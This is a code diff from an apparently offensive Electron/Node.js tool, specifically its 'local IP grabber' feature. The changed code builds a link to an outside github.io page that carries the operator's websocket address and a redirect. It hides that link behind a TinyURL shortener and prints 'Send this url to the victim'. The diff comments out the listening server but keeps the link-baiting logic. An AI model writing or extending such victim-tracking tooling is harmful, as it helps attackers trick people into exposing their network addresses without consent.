@@ -2,7 +2,6 @@ const { exec, spawn } = require("node:child_process");
 const { ipcRenderer } = require("electron");
 const prettylink = require('prettylink');
 const ip = require("ip");
-const ws = require("ws");
 const cors = require("cors");
 const express = require("express");
 const app = express();
@@ -252,14 +251,15 @@ if(document.getElementById("localIpGrabberBtn")) {
         if(server != undefined) {
             server.close()
         }
-        
-        server = app.listen(3000, () => {
-            const url = `https://zhiftydk.github.io/getlocalip?ws=ws://${ip.address()}:3000&r=${redirectUrl.value}`;
-            const tinyurl = new prettylink.TinyURL();
-            tinyurl.short(url).then(url => {
-                output.value += `Send this url to the victim: ${url}\r\n`;
-            });
+        const url = `https://zhiftydk.github.io/getlocalip?ws=ws://${ip.address()}:3000&r=${redirectUrl.value}`;
+        console.log(url)
+        const tinyurl = new prettylink.TinyURL();
+        tinyurl.short(url).then(url => {
+            output.value += `Send this url to the victim: ${url}\r\n`;
         });
+        // server = app.listen(3000, () => {
+            
+        // });
     });
     document.getElementById("localIpGrabberSave").addEventListener("click", () => {
         download("localipgrabberlog", "localIpGrabberOutput");
